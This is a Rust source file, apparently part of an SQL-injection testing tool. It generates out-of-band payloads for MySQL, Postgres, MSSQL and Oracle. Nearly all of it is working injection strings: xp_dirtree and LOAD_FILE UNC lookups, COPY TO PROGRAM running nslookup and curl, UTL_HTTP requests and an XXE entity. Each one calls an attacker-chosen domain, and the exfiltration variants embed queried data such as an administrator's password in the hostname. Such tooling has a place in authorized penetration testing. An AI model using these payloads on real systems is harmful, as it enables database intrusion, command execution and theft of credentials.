//! Per-DBMS OOB interaction and exfiltration payload builders (P5 split):
//! generic fan-in + MySQL/Postgres/MSSQL/Oracle private builders.
use super::dns::{build_subdomain, sanitize_dns_label};
use super::{OobChannel, OobPayload};

/// Generate OOB interaction payloads (no data exfil, just callback) for a
/// DBMS. Each payload embeds `fqdn = <token>.<domain>`.
///
/// `dbms` is one of `mysql | postgres | mssql | oracle`; `None`/unknown
/// (including `sqlite`, which has no network exfil primitive) yields a
/// generic 3-probe set (MSSQL + Oracle + MySQL) covering the most
/// common stacks.
#[must_use]
pub fn oob_payloads_for(dbms: Option<&str>, domain: &str, token: &str) -> Vec<OobPayload> {
    let fqdn = build_subdomain(token, domain);
    match dbms {
        Some("mysql") => mysql_oob(&fqdn, token),
        Some("postgres") => postgres_oob(&fqdn, token),
        Some("mssql") => mssql_oob(&fqdn, token),
        Some("oracle") => oracle_oob(&fqdn, token),
        _ => {
            let mut out = Vec::with_capacity(3);
            // Most reliable probe per stack first.
            if let Some(p) = mssql_oob(&fqdn, token).first() {
                out.push(p.clone());
            }
            if let Some(p) = oracle_oob(&fqdn, token).first() {
                out.push(p.clone());
            }
            if let Some(p) = mysql_oob(&fqdn, token).first() {
                out.push(p.clone());
            }
            for p in &mut out {
                "generic".clone_into(&mut p.dbms);
            }
            out
        }
    }
}

/// Generate OOB **data exfiltration** payloads embedding `select_expr`.
///
/// `select_expr` is a scalar subquery, e.g.
/// `(SELECT password FROM users WHERE username='administrator')`.
/// The value is concatenated into the looked-up hostname so it shows up in
/// collaborator DNS/HTTP logs. Prefer alphanumeric columns; for binary data
/// wrap the expression with `HEX(...)` / `ENCODE(..., 'hex')` / `RAWTOHEX`.
#[must_use]
pub fn oob_exfil_payloads_for(
    dbms: Option<&str>,
    domain: &str,
    token: &str,
    select_expr: &str,
) -> Vec<OobPayload> {
    let dom = domain.trim().trim_end_matches('.').to_ascii_lowercase();
    let label = sanitize_dns_label(token);
    let suffix = format!("{label}.{dom}");
    match dbms {
        Some("mssql") => vec![
            OobPayload::new(
                format!(
                    "'; DECLARE @p varchar(1024); SET @p=({select_expr}); EXEC('master..xp_dirtree ''\\\\''+@p+''.{suffix}\\\\a''') --"
                ),
                "mssql",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
            OobPayload::new(
                format!("'; EXEC master..xp_dirtree '\\\\({select_expr}).{suffix}\\a' --"),
                "mssql",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
        ],
        Some("oracle") => vec![
            OobPayload::new(
                format!(
                    "' AND UTL_INADDR.GET_HOST_ADDRESS(({select_expr})||'.{suffix}') IS NOT NULL --"
                ),
                "oracle",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
            OobPayload::new(
                format!(
                    "' AND UTL_HTTP.REQUEST('http://'||({select_expr})||'.{suffix}/') IS NOT NULL --"
                ),
                "oracle",
                OobChannel::Http,
                token,
                format!("<data>.{suffix}"),
            ),
        ],
        Some("mysql") => vec![OobPayload::new(
            format!("' AND LOAD_FILE(CONCAT('\\\\\\\\',({select_expr}),'.{suffix}','\\\\a')) -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            format!("<data>.{suffix}"),
        )],
        Some("postgres") => vec![OobPayload::new(
            format!(
                "'; DO $$DECLARE c text; p text; BEGIN SELECT ({select_expr}) INTO p; c:='copy (SELECT '''') to program ''nslookup '||p||'.{suffix}'''; EXECUTE c; END;$$ --"
            ),
            "postgres",
            OobChannel::Dns,
            token,
            format!("<data>.{suffix}"),
        )],
        _ => vec![
            OobPayload::new(
                format!("'; EXEC master..xp_dirtree '\\\\({select_expr}).{suffix}\\a' --"),
                "generic",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
            OobPayload::new(
                format!(
                    "' AND UTL_INADDR.GET_HOST_ADDRESS(({select_expr})||'.{suffix}') IS NOT NULL --"
                ),
                "generic",
                OobChannel::Dns,
                token,
                format!("<data>.{suffix}"),
            ),
        ],
    }
}

fn mysql_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    // Windows-only: LOAD_FILE on a UNC path forces an SMB/DNS lookup.
    // Linux targets typically ignore UNC -> no callback (documented).
    vec![
        OobPayload::new(
            format!("' AND LOAD_FILE(CONCAT('\\\\\\\\','{fqdn}','\\\\a')) -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{fqdn}','\\\\a')) -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        // PortSwigger second UNC primitive: SELECT ... INTO OUTFILE on a
        // UNC path (Windows-only, same FILE-privilege requirement).
        // Appended last so existing probe order is unchanged.
        OobPayload::new(
            format!("' UNION SELECT 'injekt' INTO OUTFILE '\\\\\\\\{fqdn}\\\\a' -- -"),
            "mysql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
    ]
}

fn postgres_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    vec![
        OobPayload::new(
            format!("'; COPY (SELECT '') TO PROGRAM 'nslookup {fqdn}' --"),
            "postgres",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("'; COPY (SELECT '') TO PROGRAM 'curl http://{fqdn}/' --"),
            "postgres",
            OobChannel::Http,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("'; SELECT dblink_connect('host={fqdn} user=a password=a dbname=a') --"),
            "postgres",
            OobChannel::Dns,
            token,
            fqdn,
        ),
    ]
}

fn mssql_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    vec![
        OobPayload::new(
            format!("'; EXEC master..xp_dirtree '\\\\{fqdn}\\a' --"),
            "mssql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("'; EXEC master..xp_fileexist '\\\\{fqdn}\\a' --"),
            "mssql",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!(
                "'; DECLARE @o INT; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @o OUT; EXEC sp_OAMethod @o, 'open', NULL, 'GET', 'http://{fqdn}/', 'false'; EXEC sp_OAMethod @o, 'send'; --"
            ),
            "mssql",
            OobChannel::Http,
            token,
            fqdn,
        ),
    ]
}

fn oracle_oob(fqdn: &str, token: &str) -> Vec<OobPayload> {
    vec![
        OobPayload::new(
            format!("' AND UTL_INADDR.GET_HOST_ADDRESS('{fqdn}') IS NOT NULL --"),
            "oracle",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("' AND UTL_HTTP.REQUEST('http://{fqdn}/') IS NOT NULL --"),
            "oracle",
            OobChannel::Http,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!("' AND DBMS_LDAP.INIT(('{fqdn}',80)) IS NOT NULL --"),
            "oracle",
            OobChannel::Dns,
            token,
            fqdn,
        ),
        OobPayload::new(
            format!(
                "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://{fqdn}/\"> %remote;]>'),'/l') FROM dual --"
            ),
            "oracle",
            OobChannel::Http,
            token,
            fqdn,
        ),
    ]
}
